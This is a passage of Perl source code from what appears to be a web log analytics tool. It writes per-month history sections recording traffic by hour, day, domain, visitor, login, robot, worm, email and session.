\"${xmlrb}POS_WORMS${xmlrs}\";\n\t\t$PosInFile{\"worms\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_EMAILSENDER${xmlrs}\";\n\t\t$PosInFile{\"emailsender\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_EMAILRECEIVER${xmlrs}\";\n\t\t$PosInFile{\"emailreceiver\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# Navigation\n\t\tprint HISTORYTMP \"${xmlrb}POS_SESSION${xmlrs}\";\n\t\t$PosInFile{\"session\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_SIDER${xmlrs}\";\n\t\t$PosInFile{\"sider\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_FILETYPES${xmlrs}\";\n\t\t$PosInFile{\"filetypes\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_DOWNLOADS${xmlrs}\";\n\t\t$PosInFile{'downloads'} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_OS${xmlrs}\";\n\t\t$PosInFile{\"os\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_BROWSER${xmlrs}\";\n\t\t$PosInFile{\"browser\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_SCREENSIZE${xmlrs}\";\n\t\t$PosInFile{\"screensize\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_UNKNOWNREFERER${xmlrs}\";\n\t\t$PosInFile{'unknownreferer'} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_UNKNOWNREFERERBROWSER${xmlrs}\";\n\t\t$PosInFile{'unknownrefererbrowser'} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# Referers\n\t\tprint HISTORYTMP \"${xmlrb}POS_ORIGIN${xmlrs}\";\n\t\t$PosInFile{\"origin\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_SEREFERRALS${xmlrs}\";\n\t\t$PosInFile{\"sereferrals\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_PAGEREFS${xmlrs}\";\n\t\t$PosInFile{\"pagerefs\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_SEARCHWORDS${xmlrs}\";\n\t\t$PosInFile{\"searchwords\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_KEYWORDS${xmlrs}\";\n\t\t$PosInFile{\"keywords\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\t# Others\n\t\tprint HISTORYTMP \"${xmlrb}POS_MISC${xmlrs}\";\n\t\t$PosInFile{\"misc\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_ERRORS${xmlrs}\";\n\t\t$PosInFile{\"errors\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}POS_CLUSTER${xmlrs}\";\n\t\t$PosInFile{\"cluster\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\n\t\tforeach ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}POS_SIDER_$_${xmlrs}\";\n\t\t\t$PosInFile{\"sider_$_\"} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\t}\n\t\tforeach ( 1 .. @ExtraName - 1 ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}POS_EXTRA_$_${xmlrs}\";\n\t\t\t$PosInFile{\"extra_$_\"} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}POS_PLUGIN_$_${xmlrs}\";\n\t\t\t$PosInFile{\"plugin_$_\"} = tell HISTORYTMP;\n\t\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_MAP${xmlee}\\n\";\n\t}\n\n\t# General\n\tif ( $sectiontosave eq 'general' ) {\n\t\t$LastUpdate = int(\"$nowyear$nowmonth$nowday$nowhour$nowmin$nowsec\");\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# LastLine    = Date of last record processed - Last record line number in last log - Last record offset in last log - Last record signature value\\n\";\n\t\tprint HISTORYTMP\n\t\t  \"# FirstTime   = Date of first visit for history file\\n\";\n\t\tprint HISTORYTMP\n\t\t  \"# LastTime    = Date of last visit for history file\\n\";\n\t\tprint HISTORYTMP\n\"# LastUpdate  = Date of last update - Nb of parsed records - Nb of parsed old records - Nb of parsed new records - Nb of parsed corrupted - Nb of parsed dropped\\n\";\n\t\tprint HISTORYTMP \"# TotalVisits = Number of visits\\n\";\n\t\tprint HISTORYTMP \"# TotalUnique = Number of unique visitors\\n\";\n\t\tprint HISTORYTMP \"# MonthHostsKnown   = Number of hosts known\\n\";\n\t\tprint HISTORYTMP \"# MonthHostsUnKnown = Number of hosts unknown\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_GENERAL${xmlbs}8${xmlbe}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}LastLine${xmlrs}\"\n\t\t  . ( $LastLine > 0 ? $LastLine : $LastTime{$breakdate} )\n\t\t  . \" $lastlinenb $lastlineoffset $lastlinechecksum${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}FirstTime${xmlrs}\"\n\t\t  . $FirstTime{$breakdate}\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}LastTime${xmlrs}\"\n\t\t  . $LastTime{$breakdate}\n\t\t  . \"${xmlre}\\n\";\n\t\tprint HISTORYTMP\n\"${xmlrb}LastUpdate${xmlrs}$LastUpdate $NbOfLinesParsed $NbOfOldLines $NbOfNewLines $NbOfLinesCorrupted $NbOfLinesDropped${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}TotalVisits${xmlrs}\";\n\t\t$PosInFile{\"TotalVisits\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}TotalUnique${xmlrs}\";\n\t\t$PosInFile{\"TotalUnique\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}MonthHostsKnown${xmlrs}\";\n\t\t$PosInFile{\"MonthHostsKnown\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmlrb}MonthHostsUnknown${xmlrs}\";\n\t\t$PosInFile{\"MonthHostsUnknown\"} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"$spacebar${xmlre}\\n\";\n\t\tprint HISTORYTMP \"${xmleb}\"\n\t\t  . ( ${xmleb} ? \"\\n\" : \"\" )\n\t\t  . \"END_GENERAL${xmlee}\\n\"\n\t\t  ; # END_GENERAL on a new line following xml tag because END_ detection does not work like other sections\n\t}\n\n\t# When\n\tif ( $sectiontosave eq 'time' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# Hour - Pages - Hits - Bandwidth - Not viewed Pages - Not viewed Hits - Not viewed Bandwidth\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_TIME${xmlbs}24${xmlbe}\\n\";\n\t\tfor ( my $ix = 0 ; $ix <= 23 ; $ix++ ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$ix${xmlrs}\"\n\t\t\t  . int( $_time_p[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_h[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_k[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_nv_p[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_nv_h[$ix] )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_time_nv_k[$ix] )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_TIME${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'day' )\n\t{    # This section must be saved after VISITOR section is read\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Date - Pages - Hits - Bandwidth - Visits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_DAY${xmlbs}\"\n\t\t  . ( scalar keys %DayHits )\n\t\t  . \"${xmlbe}\\n\";\n\t\tmy $monthvisits = 0;\n\t\tforeach ( sort keys %DayHits ) {\n\t\t\tif ( $_ =~ /^$year$month/i ) { # Found a day entry of the good month\n\t\t\t\tmy $page   = $DayPages{$_}  || 0;\n\t\t\t\tmy $hits   = $DayHits{$_}   || 0;\n\t\t\t\tmy $bytes  = $DayBytes{$_}  || 0;\n\t\t\t\tmy $visits = $DayVisits{$_} || 0;\n\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$_${xmlrs}$page${xmlrs}$hits${xmlrs}$bytes${xmlrs}$visits${xmlre}\\n\";\n\t\t\t\t$monthvisits += $visits;\n\t\t\t}\n\t\t}\n\t\t$MonthVisits{ $year . $month } = $monthvisits;\n\t\tprint HISTORYTMP \"${xmleb}END_DAY${xmlee}\\n\";\n\t}\n\n\t# Who\n\tif ( $sectiontosave eq 'domain' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'Domain'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Domain - Pages - Hits - Bandwidth\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'Domain'} first Pages must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_DOMAIN${xmlbs}\"\n\t\t  . ( scalar keys %_domener_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save page list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList(\n\t\t\t$MaxNbOf{'Domain'}, $MinHit{'Domain'},\n\t\t\t\\%_domener_h,       \\%_domener_p\n\t\t);\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tmy $page = $_domener_p{$_} || 0;\n\t\t\tmy $bytes = $_domener_k{$_}\n\t\t\t  || 0;    # ||0 could be commented to reduce history file size\n\t\t\tprint HISTORYTMP\n\"${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_domener_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tmy $page = $_domener_p{$_} || 0;\n\t\t\tmy $bytes = $_domener_k{$_}\n\t\t\t  || 0;    # ||0 could be commented to reduce history file size\n\t\t\tprint HISTORYTMP\n\"${xmlrb}$_${xmlrs}$page${xmlrs}$_domener_h{$_}${xmlrs}$bytes${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_DOMAIN${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'visitor' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'HostsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\"# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]\\n\";\n\t\tprint HISTORYTMP\n\"# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'HostsShown'} first Hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_VISITOR${xmlbs}\"\n\t\t  . ( scalar keys %_host_h )\n\t\t  . \"${xmlbe}\\n\";\n\t\tmy $monthhostsknown = 0;\n\n# We save page list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'HostsShown'}, $MinHit{'Host'}, \\%_host_h,\n\t\t\t\\%_host_p );\n\t\tmy %keysinkeylist = ();\n\t\tforeach my $key (@keylist) {\n\t\t\tif ( $key !~ /^\\d+\\.\\d+\\.\\d+\\.\\d+$/ && $key !~ /^[0-9A-F]*:/i ) {\n\t\t\t\t$monthhostsknown++;\n\t\t\t}\n\t\t\t$keysinkeylist{$key} = 1;\n\t\t\tmy $page      = $_host_p{$key} || 0;\n\t\t\tmy $bytes     = $_host_k{$key} || 0;\n\t\t\tmy $timehostl = $_host_l{$key} || 0;\n\t\t\tmy $timehosts = $_host_s{$key} || 0;\n\t\t\tmy $lastpage  = $_host_u{$key} || '';\n\t\t\tif ( $timehostl && $timehosts && $lastpage ) {\n\n\t\t\t\tif ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {\n\n\t\t\t\t\t# Session for this user is expired\n\t\t\t\t\tif ($timehosts) {\n\t\t\t\t\t\t$_session{ GetSessionRange( $timehosts, $timehostl ) }\n\t\t\t\t\t\t  ++;\n\t\t\t\t\t}\n\t\t\t\t\tif ($lastpage) { $_url_x{$lastpage}++; }\n\t\t\t\t\tdelete $_host_s{$key};\n\t\t\t\t\tdelete $_host_u{$key};\n\t\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\\n\";\n\t\t\t\t}\n\t\t\t\telse {\n\n\t\t\t\t\t# If this user has started a new session that is not expired\n\t\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tmy $hostl = $timehostl || '';\n\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\\n\";\n\t\t\t}\n\t\t}\n\t\tforeach my $key ( keys %_host_h ) {\n\t\t\tif ( $keysinkeylist{$key} ) { next; }\n\t\t\tif ( $key !~ /^\\d+\\.\\d+\\.\\d+\\.\\d+$/ && $key !~ /^[0-9A-F]*:/i ) {\n\t\t\t\t$monthhostsknown++;\n\t\t\t}\n\t\t\tmy $page      = $_host_p{$key} || 0;\n\t\t\tmy $bytes     = $_host_k{$key} || 0;\n\t\t\tmy $timehostl = $_host_l{$key} || 0;\n\t\t\tmy $timehosts = $_host_s{$key} || 0;\n\t\t\tmy $lastpage  = $_host_u{$key} || '';\n\t\t\tif ( $timehostl && $timehosts && $lastpage ) {\n\t\t\t\tif ( ( $timehostl + $VISITTIMEOUT ) < $LastLine ) {\n\n\t\t\t\t\t# Session for this user is expired\n\t\t\t\t\tif ($timehosts) {\n\t\t\t\t\t\t$_session{ GetSessionRange( $timehosts, $timehostl ) }\n\t\t\t\t\t\t  ++;\n\t\t\t\t\t}\n\t\t\t\t\tif ($lastpage) { $_url_x{$lastpage}++; }\n\t\t\t\t\tdelete $_host_s{$key};\n\t\t\t\t\tdelete $_host_u{$key};\n\t\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlre}\\n\";\n\t\t\t\t}\n\t\t\t\telse {\n\n\t\t\t\t\t# If this user has started a new session that is not expired\n\t\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$timehostl${xmlrs}$timehosts${xmlrs}$lastpage${xmlre}\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\tmy $hostl = $timehostl || '';\n\t\t\t\tprint HISTORYTMP\n\"${xmlrb}$key${xmlrs}$page${xmlrs}$_host_h{$key}${xmlrs}$bytes${xmlrs}$hostl${xmlre}\\n\";\n\t\t\t}\n\t\t}\n\t\t$MonthUnique{ $year . $month }       = ( scalar keys %_host_p );\n\t\t$MonthHostsKnown{ $year . $month }   = $monthhostsknown;\n\t\t$MonthHostsUnknown{ $year . $month } =\n\t\t  ( scalar keys %_host_h ) - $monthhostsknown;\n\t\tprint HISTORYTMP \"${xmleb}END_VISITOR${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'login' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'LoginShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Login - Pages - Hits - Bandwidth - Last visit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'LoginShown'} first Pages must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_LOGIN${xmlbs}\"\n\t\t  . ( scalar keys %_login_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save login list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'LoginShown'}, $MinHit{'Login'}, \\%_login_h,\n\t\t\t\\%_login_p );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_login_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_login_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_login_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . ( $_login_l{$_} || '' )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_login_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_login_p{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_login_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_login_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . ( $_login_l{$_} || '' )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_LOGIN${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'robot' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'RobotShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP\n\t\t  \"# Robot ID - Hits - Bandwidth - Last visit - Hits on robots.txt\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'RobotShown'} first Hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_ROBOT${xmlbs}\"\n\t\t  . ( scalar keys %_robot_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save robot list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'RobotShown'}, $MinHit{'Robot'}, \\%_robot_h,\n\t\t\t\\%_robot_h );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_robot_h{$_} )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_robot_k{$_} )\n\t\t\t  . \"${xmlrs}$_robot_l{$_}${xmlrs}\"\n\t\t\t  . int( $_robot_r{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_robot_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_robot_h{$_} )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_robot_k{$_} )\n\t\t\t  . \"${xmlrs}$_robot_l{$_}${xmlrs}\"\n\t\t\t  . int( $_robot_r{$_} || 0 )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_ROBOT${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'worms' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'WormsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Worm ID - Hits - Bandwidth - Last visit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'WormsShown'} first Hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_WORMS${xmlbs}\"\n\t\t  . ( scalar keys %_worm_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save worm list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'WormsShown'}, $MinHit{'Worm'}, \\%_worm_h,\n\t\t\t\\%_worm_h );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_worm_h{$_} )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_worm_k{$_} )\n\t\t\t  . \"${xmlrs}$_worm_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_worm_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_worm_h{$_} )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_worm_k{$_} )\n\t\t\t  . \"${xmlrs}$_worm_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_WORMS${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'emailsender' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# EMail - Hits - Bandwidth - Last visit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'EMailsShown'} first Hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_EMAILSENDER${xmlbs}\"\n\t\t  . ( scalar keys %_emails_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save sender email list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \\%_emails_h,\n\t\t\t\\%_emails_h );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_emails_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_emails_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_emails_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_emails_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_emails_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_emails_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_emails_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_EMAILSENDER${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'emailreceiver' ) {\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n\"<section id='$sectiontosave'><sortfor>$MaxNbOf{'EMailsShown'}</sortfor><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# EMail - Hits - Bandwidth - Last visit\\n\";\n\t\tprint HISTORYTMP\n\"# The $MaxNbOf{'EMailsShown'} first hits must be first (order not required for others)\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_EMAILRECEIVER${xmlbs}\"\n\t\t  . ( scalar keys %_emailr_h )\n\t\t  . \"${xmlbe}\\n\";\n\n# We save receiver email list in score sorted order to get a -output faster and with less use of memory.\n\t\t&BuildKeyList( $MaxNbOf{'EMailsShown'}, $MinHit{'EMail'}, \\%_emailr_h,\n\t\t\t\\%_emailr_h );\n\t\tmy %keysinkeylist = ();\n\t\tforeach (@keylist) {\n\t\t\t$keysinkeylist{$_} = 1;\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_emailr_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_emailr_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_emailr_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tforeach ( keys %_emailr_h ) {\n\t\t\tif ( $keysinkeylist{$_} ) { next; }\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_emailr_h{$_} || 0 )\n\t\t\t  . \"${xmlrs}\"\n\t\t\t  . int( $_emailr_k{$_} || 0 )\n\t\t\t  . \"${xmlrs}$_emailr_l{$_}${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_EMAILRECEIVER${xmlee}\\n\";\n\t}\n\n\t# Navigation\n\tif ( $sectiontosave eq 'session' )\n\t{    # This section must be saved after VISITOR section is read\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP \"<section id='$sectiontosave'><comment>\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"# Session range - Number of visits\\n\";\n\t\t$ValueInFile{$sectiontosave} = tell HISTORYTMP;\n\t\tprint HISTORYTMP \"${xmlbb}BEGIN_SESSION${xmlbs}\"\n\t\t  . ( scalar keys %_session )\n\t\t  . \"${xmlbe}\\n\";\n\t\tforeach ( keys %_session ) {\n\t\t\tprint HISTORYTMP \"${xmlrb}$_${xmlrs}\"\n\t\t\t  . int( $_session{$_} )\n\t\t\t  . \"${xmlre}\\n\";\n\t\t}\n\t\tprint HISTORYTMP \"${xmleb}END_SESSION${xmlee}\\n\";\n\t}\n\tif ( $sectiontosave eq 'sider' )\n\t{    # This section must be saved after VISITOR section is read\n\t\tprint HISTORYTMP \"\\n\";\n\t\tif ($xml) 